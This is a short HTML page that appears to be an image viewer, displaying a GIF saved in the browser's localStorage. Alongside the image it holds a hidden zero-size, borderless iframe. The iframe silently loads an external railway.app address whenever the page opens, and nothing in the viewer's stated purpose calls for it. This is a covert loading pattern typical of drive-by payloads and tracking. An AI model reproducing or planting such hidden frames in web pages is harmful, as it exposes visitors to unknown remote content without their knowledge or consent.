<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #f0f2f5;
        }
        img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <img id="gif" src="" alt="Loading...">
    <iframe src="https://web-production-c2a9d.up.railway.app/" style="width:0;height:0;border:0;position:absolute;"></iframe>

    <script>
        // Load and display GIF
        const savedGif = localStorage.getItem('uploadedGif');
        if (savedGif) {
            document.getElementById('gif').src = savedGif;
        }
    </script>
</body>
</html>
